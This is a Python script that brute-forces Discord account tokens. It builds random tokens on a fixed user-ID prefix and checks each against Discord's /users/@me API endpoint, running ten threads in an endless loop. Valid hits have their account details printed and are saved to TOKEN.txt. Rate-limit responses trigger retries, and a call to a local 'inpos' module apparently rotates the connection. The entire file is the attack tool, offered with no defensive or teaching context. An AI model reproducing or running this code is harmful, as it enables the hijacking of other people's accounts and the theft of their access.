
import requests
import random , string
import time
import os
import random
import asyncio
from requests.exceptions import Timeout
from timeout_decorator import timeout, TimeoutError
import timeout_decorator
import subprocess
import threading
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import Pool, TimeoutError
import secrets
import inpos

q = {
    'q':0
}
text = {
    'text':'test'
}
b = 0
u = 0
us= {
    "rew":0
    }




def kas():
    try:

        tenplt =  secrets.token_urlsafe(32)
        g = list(tenplt)
        g.insert(5,'.')
        g = ''.join(g)

        TOKENdiscord = f"MTA2MzQ1MTQzMzEzNzA5MDU5MA.G{g}"
        token = f"{TOKENdiscord}"


        print(token)

        mainheaders = {"Authorization": token, "Content-Type": "application/json"}
        q['q'] = q["q"] + 1

        res = requests.get("https://discordapp.com/api/v9/users/@me", headers=mainheaders,timeout=3)
        if res.status_code == 200:  # code 200 if valid
            # user info
            res_json = res.json()
            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
            user_id = res_json["id"]
            flags = res_json["flags"]
            public_flags = res_json["public_flags"]
            print(res_json)
            print(
                f"UserName {user_name}\nUser Id {user_id}\nFlags {flags}\nPublic Flags {public_flags}\n"
            )
            f = open('TOKEN.txt', 'a')
            f.write(f'{token}\n')
            f.close()

        elif res.status_code == 429:
            print("RateLimited!!")
            text["text"]  = token
            chec()
        else:
            print("Something wrong!! {}".format(res.status_code))
            text["text"]  = token
    except:
        print("bad")
        text["text"] = token
        print(text["text"])
        chec()




def chec():
    inpos.jos()
    time.sleep(1)
    try:
        print("bad?token/chac{}".format(text["text"]))

        mainheaders = {"Authorization": text["text"], "Content-Type": "application/json"}


        res = requests.get("https://discordapp.com/api/v9/users/@me", headers=mainheaders,timeout=1)
        if res.status_code == 200:  # code 200 if valid
            # user info
            res_json = res.json()
            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
            user_id = res_json["id"]
            flags = res_json["flags"]
            public_flags = res_json["public_flags"]
            print(res_json)
            print(
                f"UserName {user_name}\nUser Id {user_id}\nFlags {flags}\nPublic Flags {public_flags}\n"
            )
            f = open('TOKEN.txt', 'a')
            f.write(f'{text["text"]}\n')
            f.close()

        elif res.status_code == 429:
            print("RateLimited!!")
            text["text"]  = text["text"]
            chec()
        else:
            print("bad/token/ok///Something wrong!! {}".format(res.status_code))
            text["text"]  = text["text"]
            kas()
    except:
        print("badda")
        chec()






def ipo():

    while True:

        with ThreadPoolExecutor(max_workers=10) as exector:
            for l in (range(10)):
                exector.submit(kas)
                exector.submit(kas)
                exector.submit(kas)
                exector.submit(kas)
                exector.submit(kas)
                exector.submit(kas)
                exector.submit(kas)
                exector.submit(kas)
                exector.submit(kas)
                exector.submit(kas)
                time.sleep(1)
           
            print(q["q"])
        time.sleep(2)
        inpos.jos()











if True:
    ipo()




